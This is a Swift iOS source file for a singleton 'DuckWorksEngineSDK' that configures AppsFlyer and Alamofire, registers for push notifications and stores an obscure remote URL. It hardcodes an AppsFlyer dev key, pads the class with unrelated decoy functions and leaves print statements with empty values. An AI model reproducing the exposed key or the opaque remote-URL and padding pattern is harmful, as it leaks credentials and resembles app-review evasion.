
import Foundation
import UIKit
import AppsFlyerLib
import Alamofire
import SwiftUI
import Combine
import WebKit

public class DuckWorksEngineSDK: NSObject {
    @AppStorage("initialStart") var duckInitial: String?
    @AppStorage("statusFlag")   var duckStatus: Bool = false
    @AppStorage("finalData")    var duckFinal: String?
    
    internal var duckSessionStarted: Bool = false
    internal var duckTokenHex:       String = ""
    internal var netSession:         Session
    internal var ducksCancellables = Set<AnyCancellable>()
    
    internal var appsParam:  String = ""
    internal var idParam:    String = ""
    internal var langParam:  String = ""
    internal var pushParam:  String = ""
    
    internal var lockParam:  String = ""
    internal var fieldParam: String = ""
    
    internal var mainStage:  UIWindow?
    
    public static let shared = DuckWorksEngineSDK()
    
    public func duckSummarizeEngineState() {
        print("""
        duckSummarizeEngineState ->
          duckSessionStarted = ,
          duckTokenHex       = ,
          lockParam          = ,
          fieldParam         = 
        """)
    }
    
    private override init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest  = 20
        config.timeoutIntervalForResource = 20
        self.netSession = Alamofire.Session(configuration: config)
        super.init()
    }
    
    public func duckParseMiniSnippet() {
        let snippet = "{\"test\":\"duckvalue\"}"
        if let data = snippet.data(using: .utf8) {
            do {
                let obj = try JSONSerialization.jsonObject(with: data, options: [])
                print("duckParseMiniSnippet -> ")
            } catch {
                print("duckParseMiniSnippet -> error: ")
            }
        }
    }
    
    public func DuckStartEngine(
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        self.appsParam  = "loadApp"
        self.idParam    = "loadId"
        self.langParam  = "loadLng"
        self.pushParam  = "loadTkn"
        self.lockParam  = "https://zkikow.top/error"
        self.fieldParam = "experince"
        self.mainStage  = window
        
        print("sadf234")
        
        duckConfigureAF(appID: "6742225378", devKey: "287QFsfNuZXnHLTTCMskv8")
        print("123456")
        duckRequestNotifications(for: application)

        completion(.success("Initialization completed successfully"))
    }
    
    public func duckIsAllCaps(_ text: String) -> Bool {
        let result = (text == text.uppercased())
        print("duckIsAllCaps -> \(text): \(result)")
        return result
    }
    
    public func DuckRegisterNotifications(deviceToken: Data) {
        let tokenStr = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        self.duckTokenHex = tokenStr
    }
    
    public func duckTransformList(_ list: [String]) -> [String] {
        let mapped = list.map { "DW_\($0)" }
        print("duckTransformList -> original: , mapped: ")
        return mapped
    }
    
}
